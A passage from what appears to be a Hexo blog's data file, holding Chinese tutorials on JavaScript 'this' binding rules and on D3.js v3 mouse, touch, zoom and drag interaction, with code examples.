class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.a = a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = <span class=\"keyword\">new</span> foo(<span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( bar.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5、箭头函数\"><a href=\"#5、箭头函数\" class=\"headerlink\" title=\"5、箭头函数\"></a>5、箭头函数</h3><p>箭头函数不使用 <code>this</code> 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 <code>this</code> 。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;id:&#x27;</span>, <span class=\"built_in\">this</span>.id);</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> id = <span class=\"number\">21</span>;</span><br><span class=\"line\">foo.call(&#123; <span class=\"attr\">id</span>: <span class=\"number\">42</span> &#125;); <span class=\"comment\">// output ------&gt; 42</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ------ 使用 traceur 编译后的代码如下： -----</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> $__1 = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;id:&#x27;</span>, $__1.id);</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> id = <span class=\"number\">21</span>;</span><br><span class=\"line\">foo(&#123;<span class=\"attr\">id</span>: <span class=\"number\">42</span>&#125;);  <span class=\"comment\">// output ------&gt; 42</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、常见-this-指向总结\"><a href=\"#6、常见-this-指向总结\" class=\"headerlink\" title=\"6、常见 this 指向总结\"></a>6、常见 this 指向总结</h3><ol>\n<li> 在全局环境下，即在任何函数体外，<code>this</code> 指向全局对象（<code>window</code> 、<code>global</code>）；</li>\n<li> 函数直接调用时，<code>this</code> 指向全局对象，如执行函数中嵌套的函数；</li>\n<li> 对象方法中的 <code>this</code> ，与调用该方法的对象绑定；</li>\n<li> 构造函数中的 <code>this</code> ，与即将被创建的新对象绑定；</li>\n<li> 通过 <code>call</code> 和 <code>apply</code> 调用，函数中的 <code>this</code> 被动态绑定到第一个元素 ；</li>\n<li> 通过 <code>bind</code> 方法传入对象，函数中<code>this</code> 将永久地被绑定到了 <code>bind</code> 的第一个参数；</li>\n<li> 事件处理函数中的 <code>this</code>，指向监听器所在的 <code>DOM</code> 元素，与 <code>event.currentTarget</code> 一致；</li>\n</ol>\n<h3 id=\"7、判断-this-指向的步骤\"><a href=\"#7、判断-this-指向的步骤\" class=\"headerlink\" title=\"7、判断 this 指向的步骤\"></a>7、判断 this 指向的步骤</h3><ol>\n<li>首先查看函数调用的位置</li>\n<li>看这个函数是否被显示的使用 <code>call</code>、 <code>apply</code>、 <code>bind</code> 等显示绑定，如果是，则会在代码中明确说明 <code>this</code> 的指向，否则进行下一步</li>\n<li>看这个函数是被谁（对象、数组、函数等）调用，如果是用 <code>.</code> 操作符调用，则 <code>this</code> 指向该对象，否则进行下一步</li>\n<li>是否使用 <code>new</code> 关键字调用了该函数，如果是，<code>this</code> 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步</li>\n<li>是否在箭头函数中使用 <code>this</code>，如果是，则 <code>this</code> 指向父作用域中的上下文对象，否则进行下一步</li>\n<li>如果是使用严格模式，则 <code>this</code> 关键字是未定义的，否则 <code>this</code> 指向全局对象 <code>window</code> 或 <code>global</code></li>\n</ol>\n<h3 id=\"8、注意事项\"><a href=\"#8、注意事项\" class=\"headerlink\" title=\"8、注意事项\"></a>8、注意事项</h3><ol>\n<li>函数的执行过程中调用位置如何决定 <code>this</code> 的绑定对象</li>\n<li>如果把 <code>null</code> 或者 <code>undefined</code> 作为 <code>this</code> 的绑定对象传入 <code>call</code> 、 <code>apply</code> 或者 <code>bind</code> ，这些值在调用时会被忽略，实际应用的是默认绑定规则</li>\n<li>绑定优先级：new 绑定 &gt; 显式绑定 &gt; 隐身绑定 &gt; 默认绑定</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"this-指向\"><a href=\"#this-指向\" class=\"headerlink\" title=\"this 指向\"></a>this 指向</h1><h3 id=\"1、默认绑定\"><a href=\"#1、默认绑定\" class=\"headerlink\" title=\"1、默认绑定\"></a>1、默认绑定</h3><p>独立函数调用时应用了 <code>this</code> 的默认绑定，<code>this</code> 指向全局对象</p>\n<blockquote>\n<p>如果使用严格模式（<code>use strict;</code>），那么全局对象将无法使用默认绑定，因此 <code>this</code> 会绑定到 <code>undefined</code><br>node 环境中，每个模块被 <code>function (exports, require, module, __filename, __dirname) &#123;...&#125;</code> 包裹，所以 <code>this</code> 是 <code>&#123;&#125;</code> 对象，而函数中的 <code>this</code> 是 <code>global</code> 对象，而且通过 <code>var</code> 声明的变量不会挂载在 <code>global</code> 对象下</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- 浏览器环境中 非严格模式------</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// 2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- 浏览器环境中 严格模式------</span></span><br><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// window 对象</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// TypeError</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---- node 环境中 ------</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// &#123;&#125;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>); <span class=\"comment\">// global 对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(); <span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、隐式绑定\"><a href=\"#2、隐式绑定\" class=\"headerlink\" title=\"2、隐式绑定\"></a>2、隐式绑定</h3><p>调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 <code>this</code> 绑定到这个上下文对象。</p>\n<blockquote>\n<p>无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 对象属性引用链中只有最后一层会影响调用位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">42</span>,</span><br><span class=\"line\">    foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj1 = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span>,</span><br><span class=\"line\">    obj2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">obj1.obj2.foo(); <span class=\"comment\">// 42</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//  ** 隐式丢失 **</span></span><br><span class=\"line\"><span class=\"comment\">//  被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined </span></span><br><span class=\"line\"><span class=\"comment\">//  `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = obj.foo; <span class=\"comment\">// 函数别名！</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"string\">&quot;oops, global&quot;</span>; <span class=\"comment\">// a 是全局对象的属性</span></span><br><span class=\"line\">bar(); <span class=\"comment\">// &quot;oops, global&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>回调函数会使 <code>this</code> 丢失或被修改</p>\n</blockquote>\n<h3 id=\"3、显式绑定\"><a href=\"#3、显式绑定\" class=\"headerlink\" title=\"3、显式绑定\"></a>3、显式绑定</h3><p>使用 <code>call()</code>、<code>apply()</code>、<code>bind()</code> 方法绑定 <code>this</code> 对象，动态切换上下文。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// obj 对象绑定到 foo 函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"built_in\">this</span>.a );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">foo.call( obj ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>bind()</code> 会返回一个硬编码的新函数，它会把参数设置为 <code>this</code> 的上下文并调用原始函数</p>\n</blockquote>\n<h3 id=\"4、new-绑定\"><a href=\"#4、new-绑定\" class=\"headerlink\" title=\"4、new 绑定\"></a>4、new 绑定</h3><p>发生函数调用时，会进行以下步骤：</p>\n<ol>\n<li> 创建（或者说构造）一个全新的对象。</li>\n<li> 这个新对象会被执行 [[ 原型 ]] 连接。</li>\n<li> 这个新对象会绑定到函数调用的 this 。</li>\n<li> 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.a = a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = <span class=\"keyword\">new</span> foo(<span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( bar.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5、箭头函数\"><a href=\"#5、箭头函数\" class=\"headerlink\" title=\"5、箭头函数\"></a>5、箭头函数</h3><p>箭头函数不使用 <code>this</code> 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 <code>this</code> 。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;id:&#x27;</span>, <span class=\"built_in\">this</span>.id);</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> id = <span class=\"number\">21</span>;</span><br><span class=\"line\">foo.call(&#123; <span class=\"attr\">id</span>: <span class=\"number\">42</span> &#125;); <span class=\"comment\">// output ------&gt; 42</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ------ 使用 traceur 编译后的代码如下： -----</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> $__1 = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;id:&#x27;</span>, $__1.id);</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> id = <span class=\"number\">21</span>;</span><br><span class=\"line\">foo(&#123;<span class=\"attr\">id</span>: <span class=\"number\">42</span>&#125;);  <span class=\"comment\">// output ------&gt; 42</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、常见-this-指向总结\"><a href=\"#6、常见-this-指向总结\" class=\"headerlink\" title=\"6、常见 this 指向总结\"></a>6、常见 this 指向总结</h3><ol>\n<li> 在全局环境下，即在任何函数体外，<code>this</code> 指向全局对象（<code>window</code> 、<code>global</code>）；</li>\n<li> 函数直接调用时，<code>this</code> 指向全局对象，如执行函数中嵌套的函数；</li>\n<li> 对象方法中的 <code>this</code> ，与调用该方法的对象绑定；</li>\n<li> 构造函数中的 <code>this</code> ，与即将被创建的新对象绑定；</li>\n<li> 通过 <code>call</code> 和 <code>apply</code> 调用，函数中的 <code>this</code> 被动态绑定到第一个元素 ；</li>\n<li> 通过 <code>bind</code> 方法传入对象，函数中<code>this</code> 将永久地被绑定到了 <code>bind</code> 的第一个参数；</li>\n<li> 事件处理函数中的 <code>this</code>，指向监听器所在的 <code>DOM</code> 元素，与 <code>event.currentTarget</code> 一致；</li>\n</ol>\n<h3 id=\"7、判断-this-指向的步骤\"><a href=\"#7、判断-this-指向的步骤\" class=\"headerlink\" title=\"7、判断 this 指向的步骤\"></a>7、判断 this 指向的步骤</h3><ol>\n<li>首先查看函数调用的位置</li>\n<li>看这个函数是否被显示的使用 <code>call</code>、 <code>apply</code>、 <code>bind</code> 等显示绑定，如果是，则会在代码中明确说明 <code>this</code> 的指向，否则进行下一步</li>\n<li>看这个函数是被谁（对象、数组、函数等）调用，如果是用 <code>.</code> 操作符调用，则 <code>this</code> 指向该对象，否则进行下一步</li>\n<li>是否使用 <code>new</code> 关键字调用了该函数，如果是，<code>this</code> 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步</li>\n<li>是否在箭头函数中使用 <code>this</code>，如果是，则 <code>this</code> 指向父作用域中的上下文对象，否则进行下一步</li>\n<li>如果是使用严格模式，则 <code>this</code> 关键字是未定义的，否则 <code>this</code> 指向全局对象 <code>window</code> 或 <code>global</code></li>\n</ol>\n<h3 id=\"8、注意事项\"><a href=\"#8、注意事项\" class=\"headerlink\" title=\"8、注意事项\"></a>8、注意事项</h3><ol>\n<li>函数的执行过程中调用位置如何决定 <code>this</code> 的绑定对象</li>\n<li>如果把 <code>null</code> 或者 <code>undefined</code> 作为 <code>this</code> 的绑定对象传入 <code>call</code> 、 <code>apply</code> 或者 <code>bind</code> ，这些值在调用时会被忽略，实际应用的是默认绑定规则</li>\n<li>绑定优先级：new 绑定 &gt; 显式绑定 &gt; 隐身绑定 &gt; 默认绑定</li>\n</ol>\n"},{"title":"可视化交互","date":"2021-03-23T16:00:00.000Z","_content":"\n# 可视化交互\n\n### 1、事件类型\n* 鼠标事件\n    * `click` 单击\n    * `dbclick` 双击\n    * `mousemove` 鼠标移动\n    * `mouseenter` 鼠标进入\n    * `mouseleave` 鼠标离开\n    * `mouseover` 鼠标滑入\n    * `mouseout` 鼠标滑出\n    * `mousedown` 鼠标按下\n    * `mouseup` 鼠标弹起\n* 触摸事件\n    * `touchstart` 触摸点在屏幕上接触时\n    * `touchmove` 触摸点在屏幕上移动时\n    * `touchend` 触摸点在屏幕上移开时\n* 缩放、平移事件 `d3.behavior.zoom`\n    * `d3.behavior.zoom` 创建一个缩放行为\n    * `zoom(selection)` 将此缩放行为应用到 selection 上（一般使用 `selection.call(zoom)`）\n    * `zoom.on(type, listener)` 设置事件类型和监听器\n        * `zoomstart` 缩放开始时\n        * `zoom` 缩放中\n        * `zoomend` 缩放结束时\n    * `zoom.scaleExtent()` 设置缩放的最小、最大值，默认为 `[0, +∞]`\n    * `zoom.scale()` 设置初始的缩放大小\n    * `zoom.translate()` 设置当前缩放的平移向量，默认为 `[0, 0]`\n    * `zoom.duration()` 取得或设置双击事件的过渡持续的时间\n    * `zoom.x()` 设置 X轴 方向的比例尺\n    * `zoom.y()` 设置 Y轴 方向的比例尺\n* 拖拽事件 `d3.behavior.drag`\n    * `d3.behavior.darg` 创建一个拖拽行为\n    * `darg(selection)` 将此拖拽行为应用到 selection 上（一般使用 `selection.call(darg)`）\n    * `darg.on(type, listener)` 设置事件类型和监听器\n        * `dargstart` 拖拽开始时\n        * `darg` 拖拽中\n        * `dargend` 拖拽结束时\n    * `dray.origin()` 设置拖动行为的原点\n\n### 2、事件对象 `d3.event`\n\n说明  `d3.evnet` 对象是 DOM 事件，并实现了标准事件字段\n\n* `event.x`: 相对于可视区的坐标（与 `event.clientX` 一样）\n* `event.clientX`: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准）\n* `event.offsetX`: 相对于容器的坐标（鼠标与触发事件的元素的距离）\n* `event.pageX`: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准）\n* `event.screenX`: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准）\n* `event.translate`: 返回鼠标位移的数据，如 `[100, 20]`\n* `event.scale`: 返回鼠标缩放的大小，如 `1.2`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            fill: none;\n            stroke: #090;\n            stroke-width: 4;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = document.documentElement.clientWidth;\n        let h = document.documentElement.clientHeight;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        svg.append('text')\n            .attr('x', 10)\n            .attr('y', 24)\n            .attr('class', 'mouse-info');\n\n        function updateInfo(str) {\n            svg.select('.mouse-info').text(str);\n        }\n\n        svg.on('mousemove', () => {\n            let event = d3.event;\n            let str = `x ：${event.offsetX} \\n Y: ${event.offsetY}`;\n            updateInfo(str);\n        });\n        \n        svg.on('click', function () {\n            let event = d3.event;\n            console.log(event);\n            let x = event.offsetX;\n            let y = event.offsetY;\n\n            let data = [1, 2, 3, 4];\n\n            svg.selectAll('cirle')\n                .data(data)\n                .enter()\n                .append('circle')\n                .attr('class', 'circle-item')\n                .attr('cx', x)\n                .attr('cy', y)\n                .attr('r', 0)\n            .transition()\n                .duration(2000)\n                .delay((d, i) => Math.pow(i + 1, 2) * 100)\n                .ease('ease-out')\n                .attr('r', 500)\n                .style('stroke-width', 1)\n                .style('opacity', 0)\n                .each('end', function () {\n                    d3.select(this).remove();\n                });\n                \n        });\n    </script>\n\n</body>\n\n</html>\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            opacity: .5;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 600;\n        let r = 60;\n\n        let data = [{\n            x: w / 2 - r,\n            y: w / 2 - r\n        }, {\n            x: w / 2 - r,\n            y: w / 2 + r\n        }, {\n            x: w / 2 + r,\n            y: w / 2 - r\n\n        }, {\n            x: w / 2 + r,\n            y: w / 2 + r\n        }];\n\n        function dragHandler() {\n            let event = d3.event;\n            d3.select(this)\n                .attr('transform', `translate(${event.x}, ${event.y})`);\n        }\n        \n        let drag = d3.behavior.drag().on('drag', dragHandler);\n        let color = d3.scale.category10();\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n            \n            \n        let container = svg.append('g')\n            .attr('class', 'container');\n            \n            \n        container.selectAll('circle')\n            .data(data)\n            .enter()\n            .append('circle')\n            .attr('class', 'circle-item')\n            .attr('transform', d => `translate(${d.x}, ${d.y})`)\n            .attr('r', 60)\n            .style('fill', (d, i) => color(i))\n            .call(drag);\n    </script>\n\n</body>\n\n</html>\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 600;\n        let r = 60;\n        \n        let data = [{\n            x: w / 2 - r,\n            y: w / 2 - r\n        }, {\n            x: w / 2 - r,\n            y: w / 2 + r\n        }, {\n            x: w / 2 + r,\n            y: w / 2 - r\n            \n        }, {\n            x: w / 2 + r,\n            y: w / 2 + r\n        }];\n\n        function zoomHandler () {\n            let event = d3.event;\n            d3.select('.container')\n                .attr('transform', `translate(${event.translate}) scale(${event.scale})`);\n        }\n\n        let zoom = d3.behavior.zoom()\n            .scaleExtent([1, 10])\n            .on('zoom', zoomHandler);\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h)\n            .call(zoom);\n\n\n        let container = svg.append('g')\n            .attr('class', 'container');\n\n\n        container.selectAll('circle')\n            .data(data)\n            .enter()\n            .append('circle')\n            .attr('class', 'circle-item')\n            .attr('transform', d => `translate(${d.x}, ${d.y})`)\n            .attr('r', 60);\n    </script>\n\n</body>\n\n</html>\n```","source":"_posts/D3.js/可视化交互.md","raw":"---\ntitle: 可视化交互\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 可视化交互\n\n### 1、事件类型\n* 鼠标事件\n    * `click` 单击\n    * `dbclick` 双击\n    * `mousemove` 鼠标移动\n    * `mouseenter` 鼠标进入\n    * `mouseleave` 鼠标离开\n    * `mouseover` 鼠标滑入\n    * `mouseout` 鼠标滑出\n    * `mousedown` 鼠标按下\n    * `mouseup` 鼠标弹起\n* 触摸事件\n    * `touchstart` 触摸点在屏幕上接触时\n    * `touchmove` 触摸点在屏幕上移动时\n    * `touchend` 触摸点在屏幕上移开时\n* 缩放、平移事件 `d3.behavior.zoom`\n    